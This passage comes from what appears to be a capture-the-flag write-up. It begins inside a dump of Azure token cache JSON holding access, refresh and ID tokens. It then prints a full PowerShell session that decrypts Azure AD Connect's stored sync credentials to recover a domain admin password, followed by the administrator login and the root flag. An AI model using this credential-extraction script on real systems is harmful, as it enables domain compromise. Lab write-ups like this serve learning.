ZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJsM2xBR3NBRVYwcVdQelJ1Vkh4U0FBIiwidmVyIjoiMS4wIn0.czHUwYjleGp2C1c_BMZIZkEHz-12R86qmngaiyTeTW_bM659hqetbQylvf_qCJDuxD8e28H6Oqw5Hn1Hwij7yHK-kOjUeUlXkGyzFhQbDf3CQLvFsZioUiHHiighrVjZfu6Rolv8fxoG3Q8cXS-Ms_Wm6RI-zcaK9Eyu841D51jzvYI60rC9HTummktfVURP2xf3DnskqjJF1dDlSi62gPGXGk0xZordZFiGoYAtv8qiMAiSCioN_sw_xWRJ250nvw90biQ1NkPRpSGf8jNpbYktB0Ti8-sNblaGRJBQqmHxZ-0PkSq31op2CzHN7wwYCJOEoJpOtS-x4j1DGZ19hA","AccessTokenType":"Bearer","ExpiresOn":{"DateTime":"\/Date(1578062173584)\/","OffsetMinutes":0},"ExtendedExpiresOn":{"DateTime":"\/Date(1578062173584)\/","OffsetMinutes":0},"ExtendedLifeTimeToken":false,"IdToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4Mjc2LCJuYmYiOjE1NzgwNTgyNzYsImV4cCI6MTU3ODA2MjE3NiwiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.","TenantId":"372efea9-7bc4-4b76-8839-984b45edfb98","UserInfo":{"DisplayableId":"john@a67632354763outlook.onmicrosoft.com","FamilyName":"Clark","GivenName":"John","IdentityProvider":"https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/","PasswordChangeUrl":null,"PasswordExpiresOn":null,"UniqueId":"e4f56bc1-021f-4795-bca2-bedfc819e90a"}},"UserAssertionHash":null}‘https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://management.core.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0‡{"RefreshToken":"AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA","ResourceInResponse":"https:\/\/management.core.windows.net\/","Result":{"AccessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYWNyIjoiMSIsImFpbyI6IjQyVmdZSGc3ajlGN3oxK24renhKZktXQmpxcWRYMzFEVDNLc2ovL2FzT1d5VFcycTNRSUEiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMTk1MGEyNTgtMjI3Yi00ZTMxLWE5Y2YtNzE3NDk1OTQ1ZmMyIiwiYXBwaWRhY3IiOiIwIiwiZmFtaWx5X25hbWUiOiJDbGFyayIsImdpdmVuX25hbWUiOiJKb2huIiwiZ3JvdXBzIjpbImM3OTRlNzE3LTIxZWYtNDljZS1hZjAwLTljMDEwZGM0MWE3NiJdLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoid1U4Y1RtUm5tTzM2Z1E5MEx4VUNiN0tGMXZ3NlVUVlVKa1VPNThJd3NVTSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiI4MjNlVzFyWmZFQ1hEV2lHaHQ1UkFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyI2MmU5MDM5NC02OWY1LTQyMzctOTE5MC0wMTIxNzcxNDVlMTAiXX0.ja68GQ9Suvm8-6a732DZy7Z7Q62XnmL0hsVnMKP3L-u7KB9W8nafebCzEmwhAoAzEqVOKfApM8VjOALGJcgz60sYbN0JtK4RaHCiF0yQogGTvgFe3FMB-26wCxGo-d_hTxiPiFUGfTuqSMzprXfBEKLneXNKcLlkav2pPNAhLD_HoshDaznMPlt2W00rq6hJII032WoZQMPYMLJmnub4pi2N3ScroWO3zDQ16wpoFCOSYbuqoLKSm-FLN8yEhTJDf2umcOaLVE7jtnHba_rEPyC_sBtIedl1nSR8kr7A9B8dBvn0pC3M7gYIVpVwIana6pni6I8jaMwH_-3aJmCLhw","AccessTokenType":"Bearer","ExpiresOn":{"DateTime":"\/Date(1578062154521)\/","OffsetMinutes":0},"ExtendedExpiresOn":{"DateTime":"\/Date(1578062154521)\/","OffsetMinutes":0},"ExtendedLifeTimeToken":false,"IdToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.","TenantId":"372efea9-7bc4-4b76-8839-984b45edfb98","UserInfo":{"DisplayableId":"john@a67632354763outlook.onmicrosoft.com","FamilyName":"Clark","GivenName":"John","IdentityProvider":"https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/","PasswordChangeUrl":null,"PasswordExpiresOn":null,"UniqueId":"e4f56bc1-021f-4795-bca2-bedfc819e90a"}},"UserAssertionHash":null}

## Password Hash Synchronisation

A few goolge search lead us to this article about
[Azure AD Connect for Red Teamers](https://blog.xpnsec.com/azuread-connect-for-redteam/).

We try the POC in the article on our box but the first line seems wrong as we
get an error when we try to connect to the local DB. The trick is to use
`trusted_connection` and to have the `Data source` set to `.`.

Then we easily retrive the administrator password.

    :::text
    *Evil-WinRM* PS C:> $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=.;Initial Catalog=ADSync;trusted_connection=true;"
    *Evil-WinRM* PS C:> $client.Open()
    *Evil-WinRM* PS C:> $cmd = $client.CreateCommand()
    *Evil-WinRM* PS C:> $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
    *Evil-WinRM* PS C:> $reader = $cmd.ExecuteReader()
    *Evil-WinRM* PS C:> $reader.Read() | Out-Null
    *Evil-WinRM* PS C:> $key_id = $reader.GetInt32(0)
    *Evil-WinRM* PS C:> $instance_id = $reader.GetGuid(1)
    *Evil-WinRM* PS C:> $entropy = $reader.GetGuid(2)
    *Evil-WinRM* PS C:> $reader.Close()
    *Evil-WinRM* PS C:> $cmd = $client.CreateCommand()
    *Evil-WinRM* PS C:> $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
    *Evil-WinRM* PS C:> $reader = $cmd.ExecuteReader()
    *Evil-WinRM* PS C:> $reader.Read() | Out-Null
    *Evil-WinRM* PS C:> $config = $reader.GetString(0)
    *Evil-WinRM* PS C:> $crypted = $reader.GetString(1)
    *Evil-WinRM* PS C:> $reader.Close()
    *Evil-WinRM* PS C:> add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll’
    *Evil-WinRM* PS C:> $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    *Evil-WinRM* PS C:> $km.LoadKeySet($entropy, $instance_id, $key_id)
    *Evil-WinRM* PS C:> $key = $null
    *Evil-WinRM* PS C:> $km.GetActiveCredentialKey([ref]$key)
    *Evil-WinRM* PS C:> $key2 = $null
    *Evil-WinRM* PS C:> $km.GetKey(1, [ref]$key2)
    *Evil-WinRM* PS C:> $decrypted = $null
    *Evil-WinRM* PS C:> $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
    *Evil-WinRM* PS C:> $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
    *Evil-WinRM* PS C:> $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
    *Evil-WinRM* PS C:> $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
    *Evil-WinRM* PS C:> Write-Host ("Domain: " + $domain.Domain)
    Domain: MEGABANK.LOCAL
    *Evil-WinRM* PS C:> Write-Host ("Username: " + $username.Username)
    Username: administrator
    *Evil-WinRM* PS C:> Write-Host ("Password: " + $password.Password)
    Password: d0m@in4dminyeah!

We connect to the box with the domain admin account and retrieve the root flag.

    :::text
    root@kalili:~/tools/github/evil-winrm# ruby evil-winrm.rb -u administrator -i 10.10.10.172 -p 'd0m@in4dminyeah!'

    Evil-WinRM shell v1.8

    Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
    12909612d25c8dcf6e5a07d1a804a0bc

# Wrapping up

The user part of the box was classical and quit easy. The root part allow me to
learn a few things about Azure, Azure AD and how the Password Hash
Synchronisation works.

